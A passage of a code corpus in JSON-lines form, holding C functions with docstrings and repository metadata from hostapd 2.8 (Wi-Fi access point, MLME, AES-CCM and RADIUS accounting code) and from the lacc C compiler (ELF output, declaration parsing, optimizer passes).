(hapd->conf->wmm_uapsd &&\n\t\t    (hapd->iface->drv_flags & WPA_DRIVER_FLAGS_AP_UAPSD))\n\t\t\tbssid_info |= NEI_REP_BSSID_INFO_APSD;\n\t}\n\n\tif (ht) {\n\t\tbssid_info |= NEI_REP_BSSID_INFO_HT |\n\t\t\tNEI_REP_BSSID_INFO_DELAYED_BA;\n\n\t\t/* VHT bit added in IEEE P802.11-REVmc/D4.3 */\n\t\tif (vht)\n\t\t\tbssid_info |= NEI_REP_BSSID_INFO_VHT;\n\t}\n\n\t/* TODO: Set NEI_REP_BSSID_INFO_MOBILITY_DOMAIN if MDE is set */\n\n\tif (ieee80211_freq_to_channel_ext(hapd->iface->freq,\n\t\t\t\t\t  hapd->iconf->secondary_channel,\n\t\t\t\t\t  hapd->iconf->vht_oper_chwidth,\n\t\t\t\t\t  &op_class, &channel) ==\n\t    NUM_HOSTAPD_MODES)\n\t\treturn;\n\twidth = hostapd_get_nr_chan_width(hapd, ht, vht);\n\tif (vht) {\n\t\tcenter_freq1_idx = hapd->iconf->vht_oper_centr_freq_seg0_idx;\n\t\tif (width == NR_CHAN_WIDTH_80P80)\n\t\t\tcenter_freq2_idx =\n\t\t\t\thapd->iconf->vht_oper_centr_freq_seg1_idx;\n\t} else if (ht) {\n\t\tieee80211_freq_to_chan(hapd->iface->freq +\n\t\t\t\t       10 * hapd->iconf->secondary_channel,\n\t\t\t\t       &center_freq1_idx);\n\t}\n\n\tssid.ssid_len = hapd->conf->ssid.ssid_len;\n\tos_memcpy(ssid.ssid, hapd->conf->ssid.ssid, ssid.ssid_len);\n\n\t/*\n\t * Neighbor Report element size = BSSID + BSSID info + op_class + chan +\n\t * phy type + wide bandwidth channel subelement.\n\t */\n\tnr = wpabuf_alloc(ETH_ALEN + 4 + 1 + 1 + 1 + 5);\n\tif (!nr)\n\t\treturn;\n\n\twpabuf_put_data(nr, hapd->own_addr, ETH_ALEN);\n\twpabuf_put_le32(nr, bssid_info);\n\twpabuf_put_u8(nr, op_class);\n\twpabuf_put_u8(nr, channel);\n\twpabuf_put_u8(nr, ieee80211_get_phy_type(hapd->iface->freq, ht, vht));\n\n\t/*\n\t * Wide Bandwidth Channel subelement may be needed to allow the\n\t * receiving STA to send packets to the AP. See IEEE P802.11-REVmc/D5.0\n\t * Figure 9-301.\n\t */\n\twpabuf_put_u8(nr, WNM_NEIGHBOR_WIDE_BW_CHAN);\n\twpabuf_put_u8(nr, 3);\n\twpabuf_put_u8(nr, width);\n\twpabuf_put_u8(nr, center_freq1_idx);\n\twpabuf_put_u8(nr, center_freq2_idx);\n\n\thostapd_neighbor_set(hapd, hapd->own_addr, &ssid, nr, hapd->iconf->lci,\n\t\t\t     hapd->iconf->civic, hapd->iconf->stationary_ap);\n\n\twpabuf_free(nr);\n#endif /* NEED_AP_MLME */\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/neighbor_db.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * mlme_reassociate_indication - Report the establishment of an reassociation\n * with a specific peer MAC entity\n * @hapd: BSS data\n * @sta: peer STA data\n *\n * MLME calls this function as a result of the establishment of an\n * reassociation with a specific peer MAC entity that resulted from a\n * reassociation procedure that was initiated by that specific peer MAC entity.\n *\n * PeerSTAAddress = sta->addr\n */\n", "func_signal": "void mlme_reassociate_indication(struct hostapd_data *hapd,\n\t\t\t\t struct sta_info *sta)", "code": "{\n\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_MLME,\n\t\t       HOSTAPD_LEVEL_DEBUG,\n\t\t       \"MLME-REASSOCIATE.indication(\" MACSTR \")\",\n\t\t       MAC2STR(sta->addr));\n\tif (sta->auth_alg != WLAN_AUTH_FT &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_SK &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_SK_PFS &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_PK)\n\t\tmlme_deletekeys_request(hapd, sta);\n\tap_sta_clear_disconnect_timeouts(hapd, sta);\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/ap_mlme.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/* CONFIG_IEEE80211N */\n", "func_signal": "int hostapd_check_ht_capab(struct hostapd_iface *iface)", "code": "{\n#ifdef CONFIG_IEEE80211N\n\tint ret;\n\tif (!iface->conf->ieee80211n)\n\t\treturn 0;\n\n\tif (iface->current_mode->mode != HOSTAPD_MODE_IEEE80211B &&\n\t    iface->current_mode->mode != HOSTAPD_MODE_IEEE80211G &&\n\t    (iface->conf->ht_capab & HT_CAP_INFO_DSSS_CCK40MHZ)) {\n\t\twpa_printf(MSG_DEBUG,\n\t\t\t   \"Disable HT capability [DSSS_CCK-40] on 5 GHz band\");\n\t\tiface->conf->ht_capab &= ~HT_CAP_INFO_DSSS_CCK40MHZ;\n\t}\n\n\tif (!ieee80211n_supported_ht_capab(iface))\n\t\treturn -1;\n#ifdef CONFIG_IEEE80211AC\n\tif (iface->conf->ieee80211ac &&\n\t    !ieee80211ac_supported_vht_capab(iface))\n\t\treturn -1;\n#endif /* CONFIG_IEEE80211AC */\n\tret = ieee80211n_check_40mhz(iface);\n\tif (ret)\n\t\treturn ret;\n\tif (!ieee80211n_allowed_ht40_channel_pair(iface))\n\t\treturn -1;\n#endif /* CONFIG_IEEE80211N */\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/hw_features.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * fst_group_get_peer_other_connection_1 - Find peer's \"other\" connection\n * (iface, MAC tuple) by using peer's MB IE on iface.\n *\n * @iface: iface on which FST Setup Request was received\n * @peer_addr: Peer address on iface\n * @band_id: \"other\" connection band id\n * @other_peer_addr (out): Peer's MAC address on the \"other\" connection (on the\n *   \"other\" iface)\n *\n * This function parses peer's MB IE on iface. It looks for peer's MAC address\n * on band_id (tmp_peer_addr). Next all interfaces are iterated to find an\n * interface which correlates with band_id. If such interface is found, peer\n * database is iterated to see if tmp_peer_addr is connected over it.\n */\n", "func_signal": "static struct fst_iface *\nfst_group_get_peer_other_connection_1(struct fst_iface *iface,\n\t\t\t\t      const u8 *peer_addr, u8 band_id,\n\t\t\t\t      u8 *other_peer_addr)", "code": "{\n\tconst struct wpabuf *mbies;\n\tstruct fst_iface *other_iface;\n\tconst u8 *tmp_peer_addr;\n\n\t/* Get peer's MB IEs on iface */\n\tmbies = fst_iface_get_peer_mb_ie(iface, peer_addr);\n\tif (!mbies)\n\t\treturn NULL;\n\n\t/* Get peer's MAC address on the \"other\" interface */\n\ttmp_peer_addr = fst_mbie_get_peer_addr_for_band(mbies, band_id);\n\tif (!tmp_peer_addr) {\n\t\tfst_printf(MSG_INFO,\n\t\t\t   \"couldn't extract other peer addr from mbies\");\n\t\treturn NULL;\n\t}\n\n\tfst_printf(MSG_DEBUG, \"found other peer addr from mbies: \" MACSTR,\n\t\t   MAC2STR(tmp_peer_addr));\n\n\tforeach_fst_group_iface(fst_iface_get_group(iface), other_iface) {\n\t\tif (other_iface == iface ||\n\t\t    band_id != fst_iface_get_band_id(other_iface))\n\t\t\tcontinue;\n\t\tif (fst_iface_is_connected(other_iface, tmp_peer_addr, FALSE)) {\n\t\t\tos_memcpy(other_peer_addr, tmp_peer_addr, ETH_ALEN);\n\t\t\treturn other_iface;\n\t\t}\n\t}\n\n\treturn NULL;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/fst/fst_group.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * mlme_authenticate_indication - Report the establishment of an authentication\n * relationship with a specific peer MAC entity\n * @hapd: BSS data\n * @sta: peer STA data\n *\n * MLME calls this function as a result of the establishment of an\n * authentication relationship with a specific peer MAC entity that\n * resulted from an authentication procedure that was initiated by\n * that specific peer MAC entity.\n *\n * PeerSTAAddress = sta->addr\n * AuthenticationType = sta->auth_alg (WLAN_AUTH_OPEN / WLAN_AUTH_SHARED_KEY)\n */\n", "func_signal": "void mlme_authenticate_indication(struct hostapd_data *hapd,\n\t\t\t\t  struct sta_info *sta)", "code": "{\n\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_MLME,\n\t\t       HOSTAPD_LEVEL_DEBUG,\n\t\t       \"MLME-AUTHENTICATE.indication(\" MACSTR \", %s)\",\n\t\t       MAC2STR(sta->addr), mlme_auth_alg_str(sta->auth_alg));\n\tif (sta->auth_alg != WLAN_AUTH_FT &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_SK &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_SK_PFS &&\n\t    sta->auth_alg != WLAN_AUTH_FILS_PK &&\n\t    !(sta->flags & WLAN_STA_MFP))\n\t\tmlme_deletekeys_request(hapd, sta);\n\tap_sta_clear_disconnect_timeouts(hapd, sta);\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/ap_mlme.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/* AES-CCM with fixed L=2 and aad_len <= 30 assumption */\n", "func_signal": "int aes_ccm_ad(const u8 *key, size_t key_len, const u8 *nonce,\n\t       size_t M, const u8 *crypt, size_t crypt_len,\n\t       const u8 *aad, size_t aad_len, const u8 *auth, u8 *plain)", "code": "{\n\tconst size_t L = 2;\n\tvoid *aes;\n\tu8 x[AES_BLOCK_SIZE], a[AES_BLOCK_SIZE];\n\tu8 t[AES_BLOCK_SIZE];\n\n\tif (aad_len > 30 || M > AES_BLOCK_SIZE)\n\t\treturn -1;\n\n\taes = aes_encrypt_init(key, key_len);\n\tif (aes == NULL)\n\t\treturn -1;\n\n\t/* Decryption */\n\taes_ccm_encr_start(L, nonce, a);\n\taes_ccm_decr_auth(aes, M, a, auth, t);\n\n\t/* plaintext = msg XOR (S_1 | S_2 | ... | S_n) */\n\taes_ccm_encr(aes, L, crypt, crypt_len, plain, a);\n\n\taes_ccm_auth_start(aes, M, L, nonce, aad, aad_len, crypt_len, x);\n\taes_ccm_auth(aes, plain, crypt_len, x);\n\n\taes_encrypt_deinit(aes);\n\n\tif (os_memcmp_const(x, t, M) != 0) {\n\t\twpa_printf(MSG_EXCESSIVE, \"CCM: Auth mismatch\");\n\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/crypto/aes-ccm.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * mlme_deauthenticate_indication - Report the invalidation of an\n * authentication relationship with a specific peer MAC entity\n * @hapd: BSS data\n * @sta: Peer STA data\n * @reason_code: ReasonCode from Deauthentication frame\n *\n * MLME calls this function as a result of the invalidation of an\n * authentication relationship with a specific peer MAC entity.\n *\n * PeerSTAAddress = sta->addr\n */\n", "func_signal": "void mlme_deauthenticate_indication(struct hostapd_data *hapd,\n\t\t\t\t    struct sta_info *sta, u16 reason_code)", "code": "{\n\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_MLME,\n\t\t       HOSTAPD_LEVEL_DEBUG,\n\t\t       \"MLME-DEAUTHENTICATE.indication(\" MACSTR \", %d)\",\n\t\t       MAC2STR(sta->addr), reason_code);\n\tif (!hapd->iface->driver_ap_teardown)\n\t\tmlme_deletekeys_request(hapd, sta);\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/ap_mlme.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/**\n * accounting_sta_start - Start STA accounting\n * @hapd: hostapd BSS data\n * @sta: The station\n */\n", "func_signal": "void accounting_sta_start(struct hostapd_data *hapd, struct sta_info *sta)", "code": "{\n\tstruct radius_msg *msg;\n\tint interval;\n\n\tif (sta->acct_session_started)\n\t\treturn;\n\n\thostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_RADIUS,\n\t\t       HOSTAPD_LEVEL_INFO,\n\t\t       \"starting accounting session %016llX\",\n\t\t       (unsigned long long) sta->acct_session_id);\n\n\tos_get_reltime(&sta->acct_session_start);\n\tsta->last_rx_bytes_hi = 0;\n\tsta->last_rx_bytes_lo = 0;\n\tsta->last_tx_bytes_hi = 0;\n\tsta->last_tx_bytes_lo = 0;\n\thostapd_drv_sta_clear_stats(hapd, sta->addr);\n\n\tif (!hapd->conf->radius->acct_server)\n\t\treturn;\n\n\tif (sta->acct_interim_interval)\n\t\tinterval = sta->acct_interim_interval;\n\telse\n\t\tinterval = ACCT_DEFAULT_UPDATE_INTERVAL;\n\teloop_register_timeout(interval, 0, accounting_interim_update,\n\t\t\t       hapd, sta);\n\n\tmsg = accounting_msg(hapd, sta, RADIUS_ACCT_STATUS_TYPE_START);\n\tif (msg &&\n\t    radius_client_send(hapd->radius, msg, RADIUS_ACCT, sta->addr) < 0)\n\t\tradius_msg_free(msg);\n\n\tsta->acct_session_started = 1;\n}", "path": "esp32_esp8266_attacks/hostapd-2.8_source/src/ap/accounting.c", "commit_date": "2019-09-03 00:00:00", "repo_name": "Matheus-Garbelini/esp32_esp8266_attacks", "stars": 781, "license": "None", "language": "c", "size": 21353}
{"docstring": "/*\n * Associate symbol with symtab entry. Internal symbols are added to\n * table right away, but global symbols have to be buffered and flushed\n * at the end. (Mis-)use member for storing index into ELF symbol table.\n * Stack offset is otherwise only used for local variables, which will\n * not live in this symbol table.\n */\n", "func_signal": "static void elf_symtab_assoc(struct symbol *sym, Elf64_Sym entry)", "code": "{\n    struct global var;\n    if (sym->linkage == LINK_INTERN) {\n        sym->stack_offset = elf_symtab_add(entry);\n        if (is_function(sym->type)) {\n            current_function.type = CURRENT_FUNC_STATIC;\n            current_function.index = sym->stack_offset;\n        }\n    } else {\n        assert((entry.st_info >> 4) == STB_GLOBAL);\n        var.sym = sym;\n        var.entry = entry;\n        array_push_back(&globals, var);\n        if (is_function(sym->type)) {\n            current_function.type = CURRENT_FUNC_GLOBAL;\n            current_function.index = array_len(&globals) - 1;\n        }\n    }\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Parse a declaration list, beginning with a base set of specifiers,\n * followed by a list of declarators.\n *\n * Each new global declaration is assigned a clean 'struct definition'\n * object, which might get filled with initialization code, or the body\n * of a function.\n *\n * Terminate on hitting a function definition, otherwise read until the\n * end of statement.\n */\n", "func_signal": "INTERNAL struct block *declaration(\n    struct definition *def,\n    struct block *parent)", "code": "{\n    Type base, type;\n    enum symtype symtype;\n    enum linkage linkage;\n    struct definition *decl;\n    struct symbol *sym;\n    struct declaration_specifier_info info;\n\n    if (peek().token == STATIC_ASSERT) {\n        static_assertion();\n        consume(';');\n        return parent;\n    }\n\n    base = declaration_specifiers(&info);\n    switch (info.storage_class) {\n    case EXTERN:\n        symtype = SYM_DECLARATION;\n        linkage = LINK_EXTERN;\n        break;\n    case STATIC:\n        symtype = SYM_TENTATIVE;\n        linkage = LINK_INTERN;\n        break;\n    case TYPEDEF:\n        symtype = SYM_TYPEDEF;\n        linkage = LINK_NONE;\n        break;\n    default:\n        if (!current_scope_depth(&ns_ident)) {\n            symtype = SYM_TENTATIVE;\n            linkage = LINK_EXTERN;\n        } else {\n            symtype = SYM_DEFINITION;\n            linkage = LINK_NONE;\n        }\n        break;\n    }\n\n    switch (peek().token) {\n    case '*':\n    case '(':\n    case IDENTIFIER:\n        break;\n    default:\n        consume(';');\n        return parent;\n    }\n\n    while (1) {\n        type = base;\n        if (info.from_typedef && is_array(base) && !is_complete(base)) {\n            type = type_next(base);\n            type = type_create_incomplete(type);\n            type = type_apply_qualifiers(type, base);\n            assert(type_equal(type, base));\n        }\n\n        if (linkage == LINK_INTERN || linkage == LINK_EXTERN) {\n            decl = cfg_init();\n            init_declarator(decl, decl->body, type, symtype, linkage);\n            if (!decl->symbol) {\n                cfg_discard(decl);\n            } else if (is_function(decl->symbol->type)) {\n                if (info.is_inline) {\n                    sym = (struct symbol *) decl->symbol;\n                    sym->inlined = 1;\n                    sym->referenced |= info.storage_class == EXTERN;\n                }\n                return parent;\n            }\n        } else {\n            parent = init_declarator(def, parent, type, symtype, linkage);\n        }\n\n        if (peek().token == ',') {\n            next();\n        } else break;\n    }\n\n    consume(';');\n    return parent;\n}", "path": "lacc/src/parser/declaration.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Create ELF section, returning id of new section.\n *\n * Ensures that first section is all zero.\n */\n", "func_signal": "INTERNAL int elf_section_init(\n    const char *name,\n    int type,\n    int flags,\n    int link,\n    int info,\n    int addralign,\n    int entsize)", "code": "{\n    Elf64_Sym sym = {0};\n    int shid;\n\n    if (!shnum) {\n        shnum++;\n        memset(shdr, 0, sizeof(Elf64_Shdr));\n    }\n\n    shid = shnum++;\n    assert(shid < SHNUM_MAX);\n\n    memset(shdr + shid, 0, sizeof(Elf64_Shdr));\n    shdr[shid].sh_type = type;\n    shdr[shid].sh_flags = flags;\n    shdr[shid].sh_link = link;\n    shdr[shid].sh_info = info;\n    shdr[shid].sh_addralign = addralign;\n    shdr[shid].sh_entsize = entsize;\n    if (section.shstrtab) {\n        shdr[shid].sh_name = elf_strtab_add(section.shstrtab, name);\n    } else {\n        assert(!strcmp(\".shstrtab\", name));\n        shdr[shid].sh_name = elf_strtab_add(shid, name);\n        header.e_shstrndx = shid;\n    }\n\n    if (section.symtab) {\n        sym.st_info = (STB_LOCAL << 4) | STT_SECTION;\n        sym.st_shndx = shid;\n        section_symbol[shid].stack_offset = elf_symtab_add(sym);\n    }\n\n    header.e_shnum = shnum;\n    return shid;\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Add string to strtab section, returning its offset into the section\n * for use in references.\n */\n", "func_signal": "static int elf_strtab_add(int shid, const char *str)", "code": "{\n    int pos;\n\n    assert(0 < shid && shid < shnum);\n    assert(shdr[shid].sh_type == SHT_STRTAB);\n\n    if (!shdr[shid].sh_size)\n        elf_section_write(shid, NULL, 1);\n\n    pos = shdr[shid].sh_size;\n    elf_section_write(shid, str, strlen(str) + 1);\n\n    return pos;\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Construct relocation entries from pending relocations. Invoked with\n * flush(), after all data and code is processed. It is important that\n * this is called once all symbols have been written to symtab, as it\n * relies on stack_offset pointing to symtab entry index.\n */\n", "func_signal": "static void flush_relocations(void)", "code": "{\n    Elf64_Rela *entry;\n    struct pending_relocation pending;\n    size_t offset;\n    int i, j, len, index;\n\n    for (i = 0; i < SHNUM_MAX; ++i) {\n        len = array_len(&pending_relocations[i]);\n        if (!len) {\n            assert(!pending_relocations[i].data);\n            continue;\n        }\n\n        offset = elf_section_write(i, NULL, len * sizeof(Elf64_Rela));\n        entry = sbuf[i].rela + offset;\n        for (j = 0; j < len; ++j) {\n            pending = array_get(&pending_relocations[i], j);\n            assert(pending.type != R_X86_64_NONE);\n\n            index = symtab_index_of(pending.symbol);\n            entry[j].r_offset = pending.offset;\n            entry[j].r_addend = pending.addend;\n            entry[j].r_info = ELF64_R_INFO(index, pending.type);\n\n            /* Account for relocation itself. */\n            switch (pending.type) {\n            case R_X86_64_PC32:\n            case R_X86_64_PLT32:\n            case R_X86_64_GOTPCREL:\n                entry[j].r_addend -= 4;\n                break;\n            default:\n                break;\n            }\n        }\n\n        array_clear(&pending_relocations[i]);\n    }\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Align data section to specified number of bytes. Following calls to\n * elf_section_write start at this alignment. Padding is filled with\n * zero.\n */\n", "func_signal": "static int elf_section_align(int shid, int align)", "code": "{\n    size_t offset;\n    assert(0 < shid && shid < shnum);\n    assert(shdr[shid].sh_type == SHT_STRTAB\n        || shdr[shid].sh_type == SHT_SYMTAB\n        || shdr[shid].sh_type == SHT_PROGBITS\n        || shdr[shid].sh_type == SHT_RELA\n        || shdr[shid].sh_type == SHT_NOBITS);\n\n    if (shdr[shid].sh_addralign < align) {\n        shdr[shid].sh_addralign = align;\n        assert(align <= 16);\n    }\n\n    offset = shdr[shid].sh_size;\n    if (offset % align != 0) {\n        elf_section_write(shid, NULL, align - (offset % align));\n    }\n\n    return offset;\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/* Define __func__ as static const char __func__[] = sym->name;\n *\n * Just add the symbol directly as a special string value. No\n * explicit assignment reflected in the IR.\n */\n", "func_signal": "static void define_builtin__func__(String name)", "code": "{\n    Type type;\n    struct symbol *sym;\n    size_t len;\n\n    static String func = SHORT_STRING_INIT(\"__func__\");\n\n    assert(current_scope_depth(&ns_ident) == 1);\n    if (context.standard >= STD_C99) {\n        len = str_len(name);\n        type = type_create_array(basic_type__char, len + 1);\n        sym = sym_add(&ns_ident, func, type, SYM_LITERAL, LINK_INTERN);\n        sym->value.string = name;\n    }\n}", "path": "lacc/src/parser/declaration.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Write global symtab entries to section data.\n *\n * A special entry for GOT is added in the end, if we are generating\n * position independent code.\n */\n", "func_signal": "static void flush_symtab_globals(void)", "code": "{\n    int i;\n    struct global var;\n    Elf64_Sym entry = {0};\n\n    for (i = 0; i < array_len(&globals); ++i) {\n        var = array_get(&globals, i);\n        var.sym->stack_offset = elf_symtab_add(var.entry);\n    }\n\n    if (context.pic) {\n        entry.st_name = elf_strtab_add(section.strtab, \"_GLOBAL_OFFSET_TABLE_\");\n        entry.st_info = STB_GLOBAL << 4 | STT_NOTYPE;\n        entry.st_shndx = SHN_UNDEF;\n        elf_symtab_add(entry);\n    }\n\n    array_empty(&globals);\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Assign numbers from [1 .. N] to all symbols referenced by operations\n * in the basic block.\n */\n", "func_signal": "static int enumerate_used_symbols(struct block *block)", "code": "{\n    int i, n;\n    struct statement *s;\n\n    for (i = 0, n = 0; i < array_len(&block->code); ++i) {\n        s = &array_get(&block->code, i);\n        assert(s->st != IR_ASM);\n        switch (s->expr.op) {\n        default:\n            n += count_symbol((struct symbol *) s->expr.r.symbol);\n        case IR_OP_CAST:\n        case IR_OP_NOT:\n        case IR_OP_NEG:\n        case IR_OP_CALL:\n        case IR_OP_VA_ARG:\n            n += count_symbol((struct symbol *) s->expr.l.symbol);\n            break;\n        }\n\n        if (s->st == IR_ASSIGN) {\n            n += count_symbol((struct symbol *) s->t.symbol);\n        }\n    }\n\n    if (block->has_return_value || block->jump[1]) {\n        switch (block->expr.op) {\n        default:\n            n += count_symbol((struct symbol *) block->expr.r.symbol);\n        case IR_OP_CAST:\n        case IR_OP_NOT:\n        case IR_OP_NEG:\n        case IR_OP_CALL:\n        case IR_OP_VA_ARG:\n            n += count_symbol((struct symbol *) block->expr.l.symbol);\n            break;\n        }\n    }\n\n    return n;\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/* Add function parameters to scope. */\n", "func_signal": "static struct block *make_parameters_visible(\n    struct definition *def,\n    struct block *block)", "code": "{\n    int i;\n    struct member *param;\n\n    assert(def->symbol);\n    assert(is_function(def->symbol->type));\n    assert(current_scope_depth(&ns_ident) == 1);\n\n    for (i = 0; i < nmembers(def->symbol->type); ++i) {\n        param = get_member(def->symbol->type, i);\n        if (str_is_empty(param->name)) {\n            error(\"Missing parameter at position %d.\", i + 1);\n            exit(1);\n        }\n\n        assert(param->sym);\n        assert(param->sym->depth == 1);\n        assert(!is_type_placeholder(param->type));\n        assert(!is_array(param->type));\n        sym_make_visible(&ns_ident, param->sym);\n        array_push_back(&def->params, param->sym);\n    }\n\n    return block;\n}", "path": "lacc/src/parser/declaration.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Serialize basic blocks by recursively visiting each node and\n * appending to list. Assign number to each symbol in use. Return\n * number of edges in the flow graph.\n */\n", "func_signal": "static int serialize_basic_blocks(struct block *block)", "code": "{\n    if (block->color == BLACK)\n        return 0;\n\n    block->color = BLACK;\n    array_push_back(&blocklist, block);\n    if (block->jump[0]) {\n        serialize_basic_blocks(block->jump[0]);\n        if (block->jump[1]) {\n            serialize_basic_blocks(block->jump[1]);\n        }\n    }\n\n    return 1;\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Overwrite locations with offsets now found in stack_offset member of\n * label symbols. Invoked after each function, before the labels are\n * recycled.\n */\n", "func_signal": "INTERNAL void elf_flush_text_displacements(void)", "code": "{\n    int i, *ptr;\n    struct pending_displacement entry;\n\n    for (i = 0; i < array_len(&pending_displacement_list); ++i) {\n        entry = array_get(&pending_displacement_list, i);\n        assert(entry.label->stack_offset);\n\n        ptr = (int *) (sbuf[section.text].data + entry.text_offset);\n        *ptr += entry.label->stack_offset - entry.text_offset;\n    }\n\n    array_empty(&pending_displacement_list);\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Retrieve index into symbol table for section as a proper symbol,\n * making it convenient to use like any other when creating relocations.\n */\n", "func_signal": "INTERNAL const struct symbol *elf_section_symbol(int shnum)", "code": "{\n    assert(shnum > 0);\n    assert(shnum <= SHNUM_MAX);\n\n    return &section_symbol[shnum];\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/* Forward jumps through blocks with no instructions. */\n", "func_signal": "static int skip_empty_blocks(struct block *block)", "code": "{\n    int i;\n    struct block *next;\n\n    for (i = 0; i < 2 && block->jump[i]; ++i) {\n        do {\n            next = block->jump[i];\n            if (!array_len(&next->code) && next->jump[0] && !next->jump[1]) {\n                block->jump[i] = next->jump[0];\n            } else break;\n        } while (1);\n    }\n\n    return 0;\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Solve generic dataflow problem iteratively, going through each basic\n * block until visit function returns 0 for all nodes.\n */\n", "func_signal": "static void execute_iterative_dataflow(int (*callback)(struct block *))", "code": "{\n    int changes;\n\n    do {\n        changes = traverse(callback);\n    } while (changes);\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Parse function and array declarators.\n *\n * Example:\n *\n *    void (*foo)(int)\n *\n * Traverse (*foo) first, and prepended on the outer `(int) -> void`,\n * making it `* (int) -> void`. Void is used as a sentinel, the inner\n * declarator can only produce pointer, function or array.\n */\n", "func_signal": "static struct block *direct_declarator(\n    struct definition *def,\n    struct block *block,\n    Type base,\n    Type *type,\n    String *name,\n    size_t *length)", "code": "{\n    struct token t;\n    Type head = basic_type__void;\n\n    switch (peek().token) {\n    case IDENTIFIER:\n        t = next();\n        if (!name) {\n            error(\"Unexpected identifier in abstract declarator.\");\n            exit(1);\n        }\n        *name = t.d.string;\n        break;\n    case '(':\n        t = peekn(2);\n        if ((t.token == IDENTIFIER && !get_typedef(t.d.string))\n            || t.token == '('\n            || t.token == '*')\n        {\n            next();\n            block = declarator(def, block, head, &head, name);\n            consume(')');\n            if (!is_void(head)) {\n                length = NULL;\n            }\n        }\n        break;\n    default:\n        break;\n    }\n\n    switch (peek().token) {\n    case '[':\n        block = array_declarator(def, block, base, type, length);\n        break;\n    case '(':\n        next();\n        t = peek();\n        push_scope(&ns_tag);\n        push_scope(&ns_ident);\n        if (t.token == IDENTIFIER && !get_typedef(t.d.string)) {\n            *type = identifier_list(base);\n        } else {\n            block = parameter_list(def, block, base, type);\n        }\n        pop_scope(&ns_ident);\n        pop_scope(&ns_tag);\n        consume(')');\n        break;\n    default:\n        *type = base;\n        break;\n    }\n\n    if 